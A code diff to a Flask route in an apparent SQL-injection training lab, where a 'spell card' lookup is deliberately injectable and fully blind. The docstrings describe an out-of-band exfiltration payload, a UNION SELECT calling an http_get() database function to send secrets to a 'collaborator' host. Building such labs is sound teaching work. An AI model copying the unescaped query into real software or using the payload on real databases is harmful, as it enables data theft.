@@ -19,7 +19,6 @@ append-only-friendly convention as phase1.py / phase2.py.
 from __future__ import annotations
 
 import threading
-from urllib.parse import quote
 
 import requests
 from flask import Blueprint, Response, redirect, render_template, request, url_for
@@ -45,20 +44,21 @@ COLLABORATOR_BASE = "http://collaborator"
 # p3_1, The Spell Card
 # ---------------------------------------------------------------------------
 
-def _cast_and_relay(card: str) -> None:
-    """Run the (vulnerable) card lookup and relay its result out-of-band.
+def _run_card_query(card: str) -> None:
+    """Run the vulnerable card lookup in a detached background thread.
 
-    Deliberately runs in a background thread (see p3_spellcard), so the
-    HTTP response the caster gets back is returned *before* this even
-    starts, and its timing is completely independent of how long the query
-    takes. That independence is load-bearing, not incidental: without it,
-    an injected `SLEEP()` would stall the response and hand the tester an
-    in-band time-based oracle, exactly the signal this fully-blind floor is
-    built to deny. The query's duration stays trapped inside this detached
-    thread where the caster can't observe it; the only channel that ever
-    reveals anything is the out-of-band relay to `collaborator` below.
+    The result is intentionally discarded — this application never relays
+    it anywhere.  Running in a background thread keeps the HTTP response's
+    timing completely independent of query execution time, which closes the
+    time-based in-band channel (an injected SLEEP delays only this thread,
+    not the response the caster is watching).
+
+    The OOB channel this floor teaches is not wired by application code at
+    all: an injected payload that calls the http_get() UDF causes
+    *MariaDB's own process* to originate the outbound HTTP request, with no
+    involvement from Flask.  The application is genuinely oblivious to
+    whether that call ever happens.
     """
-    value = None
     conn = mysql_conn("p3_spellcard")
     try:
         with conn.cursor() as cur:
@@ -69,91 +69,49 @@ def _cast_and_relay(card: str) -> None:
             # on purpose, this is the challenge's sink.
             q = f"SELECT effect FROM cards WHERE id='{card}'"
             cur.execute(q)
-            row = cur.fetchone()
-            if row:
-                value = row.get("effect")
+            cur.fetchone()  # result discarded — Flask never sees it
     except Exception:
-        # Fully blind by design: every DB error is swallowed silently. No
-        # exception text, type, or timing-adjacent detail is ever allowed
-        # to reach the HTTP response, that's what forces a genuinely
-        # out-of-band technique instead of the error-based / boolean-blind
-        # channels every earlier floor offered in-band.
-        value = None
+        # Fully blind by design: every DB error is swallowed silently.
+        pass
     finally:
         conn.close()
-
-    # The app-layer relay (docs/oob-spike.md's "Decision"): a real,
-    # separate outbound HTTP call to collaborator carrying whatever the
-    # query returned. This is the only place the value ever becomes
-    # observable, never in this route's own response. Best-effort: a
-    # collaborator hiccup (network blip, timeout) must never surface in, or
-    # crash, the relay either.
-    relay_value = value if value else "no-effect"
-    try:
-        requests.get(
-            f"{COLLABORATOR_BASE}/spellcard-cast/{quote(str(relay_value), safe='')}",
-            timeout=2,
-        )
-    except Exception:
-        pass
 
 
 @bp.route("/p3/spellcard", methods=["GET"])
 def p3_spellcard():
     """A Greed Island spell-card reader. Deliberately, fully blind.
 
-    Given a `card` id, this looks the card up and (per the card game's own
-    flavor) "casts it into the field", but the caster never gets told
-    what happened. The HTTP response is identical no matter what: whether
-    the card exists, whether the lookup returns one row or fifty, or
-    whether the underlying query raises an exception outright, the browser
-    always sees the same generic confirmation text. Nothing data-dependent
-    ever reaches the response. That's the entire teaching point: with no
-    boolean, error, union, or timing signal visible in-band, the only way
-    to pull anything out of this endpoint is a genuinely out-of-band
-    channel.
+    The HTTP response is identical no matter what `card` contains: whether
+    the card exists, whether the lookup returns one row or fifty, or whether
+    the underlying query raises an exception.  Nothing data-dependent ever
+    reaches the response.
 
-    The query itself is still classically vulnerable, `card` is spliced
-    into a quoted string context with no escaping, so it takes the same
-    quote-breaking injection style as p1_1/p1_3. What's different from
-    every earlier floor is what happens to the result: instead of
-    rendering it into the page, the *application* relays it onward as a
-    real, separate outbound HTTP request to `collaborator` (see
-    docs/oob-spike.md's "Decision", the app layer plays the role a
-    DB-native OOB primitive would play in a real-world engagement, since a
-    stock, Linux-vanilla MariaDB has nothing that can trigger an outbound
-    call itself). A tester never sees the value here; they read it off
-    collaborator's capture feed instead (proxied at
-    /p3/spellcard/captures below).
+    The query itself is classically vulnerable (`card` is spliced into a
+    single-quoted string context with no escaping), but the result is
+    thrown away by the application.  There is no boolean, error, UNION, or
+    timing signal anywhere in the response.  The only way to extract data
+    is to make the *database engine itself* originate an outbound network
+    call carrying the result — out-of-band, on a channel this application
+    never touches.
 
-    The vulnerable lookup and its relay run in a detached background thread
-    (_cast_and_relay), so this handler returns the blind response
-    immediately and its timing never depends on the query. That's what
-    makes the "no timing signal in-band" claim actually true: an injected
-    `SLEEP()` delays only the throwaway background thread, not the response
-    the caster is timing, closing the time-based channel that would
-    otherwise be an unintended in-band solve.
-
-    The hidden `sealed_cards` table, holding this floor's flag, is never
-    touched by any query this route's own code constructs on its own. It
-    only surfaces by riding the `card` injection into a UNION SELECT
-    against it, matching the single `effect` column the visible query
-    selects.
+    The http_get() UDF (compiled into the MariaDB image, registered in the
+    seed SQL) is that primitive: an injected UNION SELECT that calls
+    http_get(CONCAT('http://collaborator/...', secret)) causes MariaDB's
+    own process to fire a real HTTP GET to collaborator, carrying the
+    exfiltrated value in the URL path.  The application has no relay code
+    and no knowledge of collaborator; the outbound call comes from the DB
+    tier, exactly as it does in a real OOB SQLi engagement.
     """
     card = request.args.get("card", "")
 
     if card:
-        # Fire-and-forget: the query + OOB relay happen off the request
-        # path entirely, so nothing about how long they take can leak back
-        # into this response's timing. daemon=True so a slow/hung query
-        # (an injected SLEEP, say) never blocks process shutdown.
+        # daemon=True: a slow/hung UDF call (e.g. injected SLEEP, or a
+        # UDF hitting an unreachable host) never blocks process shutdown.
         threading.Thread(
-            target=_cast_and_relay, args=(card,), daemon=True
+            target=_run_card_query, args=(card,), daemon=True
         ).start()
 
-    # Fully blind response: identical regardless of `card`, of whether the
-    # query matched anything, of whether it raised, and now of how long it
-    # took. No data-dependent content ever reaches the browser.
+    # Fully blind response: identical regardless of `card`.
     return render_template("p3_spellcard.html", card=card)
 
 
